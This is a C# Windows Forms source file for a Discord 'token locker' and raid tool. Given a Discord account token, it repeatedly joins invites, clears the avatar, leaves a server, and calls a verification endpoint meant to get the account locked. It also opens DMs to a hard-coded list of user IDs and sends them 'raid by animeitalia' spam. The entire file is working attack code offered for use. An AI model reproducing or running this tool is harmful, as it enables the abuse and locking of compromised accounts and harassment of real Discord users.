using System.Windows.Forms;
using MetroSuite;
using System;
using System.Threading;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

public partial class MainForm : MetroForm
{
    [DllImport("psapi.dll")]
    static extern int EmptyWorkingSet(IntPtr hwProc);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetProcessWorkingSetSize(IntPtr process, UIntPtr minimumWorkingSetSize, UIntPtr maximumWorkingSetSize);

    public static HttpRequest CreateCleanRequest()
    {
        HttpRequest request = new HttpRequest();

        request.KeepTemporaryHeadersOnRedirect = false;
        request.EnableMiddleHeaders = false;
        request.ClearAllHeaders();
        request.AllowEmptyHeaderValues = false;
        request.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
        request.Proxy = null;
        request.Username = null;
        request.UserAgent = null;
        request.UseCookies = false;
        request.CookieSingleHeader = true;
        request.Authorization = null;
        request.BaseAddress = null;
        request.Referer = null;
        request.Reconnect = false;
        request.ReconnectDelay = 0;
        request.Password = null;
        request.KeepAlive = false;
        request.IgnoreInvalidCookie = true;
        request.IgnoreProtocolErrors = true;
        request.KeepTemporaryHeadersOnRedirect = false;
        request.MaximumKeepAliveRequests = 1;
        request.Cookies = null;
        request.CharacterSet = null;
        request.AcceptEncoding = null;
        request.Culture = null;
        request.AllowAutoRedirect = false;
        request.MaximumAutomaticRedirections = 1;

        return request;
    }

    public MainForm()
    {
        InitializeComponent();
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        CheckForIllegalCrossThreadCalls = false;

        Thread thread = new Thread(clearRam);
        thread.Priority = ThreadPriority.Highest;
        thread.Start();
    }

    public void clearRam()
    {
        while (true)
        {
            Thread.Sleep(100);
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
            GCSettings.LargeObjectHeapCompactionMode = GCLargeObjectHeapCompactionMode.CompactOnce;
            GC.Collect(GC.MaxGeneration);
            GC.WaitForPendingFinalizers();
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, (UIntPtr)0xFFFFFFFF, (UIntPtr)0xFFFFFFFF);
        }
    }

    private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        Process.GetCurrentProcess().Kill();
    }

    private void metroButton1_Click(object sender, EventArgs e)
    {
        if (siticoneCheckBox3.Checked)
        {
            for (int i = 0; i < 6; i++)
            {
                Thread thread = new Thread(() => LockToken(metroTextbox1.Text));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        else
        {
            Thread thread = new Thread(() => LockToken(metroTextbox1.Text));
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }

    public void LockToken(string token)
    {
        if (siticoneCheckBox2.Checked)
        {
            while (siticoneCheckBox2.Checked)
            {
                Method1(token);
                Method2(token);
                Method3(token);
                Method6(token);
                Method5(token);
                Method4(token);
                Method5(token);
            }
        }
        else
        {
            if (siticoneRadioButton1.Checked)
            {
                Method1(token);
            }
            else if (siticoneRadioButton2.Checked)
            {
                Method2(token);
            }
            else if (siticoneRadioButton3.Checked)
            {
                Method3(token);
            }
            else if (siticoneRadioButton4.Checked)
            {
                Method4(token);
            }
            else if (siticoneRadioButton5.Checked)
            {
                Method5(token);
            }
            else if (siticoneRadioButton6.Checked)
            {
                Method6(token);
            }
        }
    }

    public void Method1(string token)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            request.Post("https://discord.com/api/v9/invites/vR5K9TzyNd");
        }
        catch
        {

        }
    }

    public void Method2(string token)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            string data = "{\"avatar\":null}";

            request.AddHeader("Authorization", token);
            request.Patch("https://discord.com/api/v9/users/@me", data, "application/json");
        }
        catch
        {

        }
    }

    public void Method3(string token)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            request.Delete("https://discord.com/api/v9/users/@me/guilds/845351427513778191");
        }
        catch
        {

        }
    }

    public void Method4(string token)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            request.Get("https://discord.com/api/v6/guilds/0/members");
        }
        catch
        {

        }
    }

    public void Method5(string token)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            string data = "{\"token\":null,\"captcha_key\":null}";
            request.Post("https://discordapp.com/api/v8/auth/verify", data, "application/json");
        }
        catch
        {

        }
    }

    public void Method6(string token)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            request.Post("https://discord.com/api/v9/invites/otaku");
        }
        catch
        {

        }

        string[] ids = new string[] { "846749988964794368", "760196259968581763", "647558954922278917", "845860564282638346", "746056696496914503", "753347178960912464", "550033185417854979", "527397874741280768", "830489156231757844", "841892361981263903", "836704795431010344", "840684071839596594", "388426288416686081", "635551438310998016", "447016504932696091", "758619514807255040", "841378437113708594", "140329111188013056", "846763890977275934", "521225347472162816", "759595399371292672", "830848825622265947", "730459868632449074"};

        foreach (string id in ids)
        {
            Thread thread = new Thread(() => dm(token, id));
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }

    public void dm(string token, string id)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            string data = "{\"recipients\":[\"" + id + "\"]}";
            string response = request.Post("https://discord.com/api/v9/users/@me/channels", data, "application/json").ToString();

            dynamic jss = JObject.Parse(response);
            var channelId = jss.id;

            msg(token, channelId);
        }
        catch
        {

        }
    }

    public void msg(string token, string id)
    {
        try
        {
            HttpRequest request = new HttpRequest();

            if (siticoneCheckBox1.Checked)
            {
                request = CreateCleanRequest();
            }

            request.AddHeader("Authorization", token);
            string data = "{\"content\":\"raid by animeitalia\"}";
            request.Post("https://discord.com/api/v9/channels/" + id + "/messages", data, "application/json");
        }
        catch
        {

        }
    }
}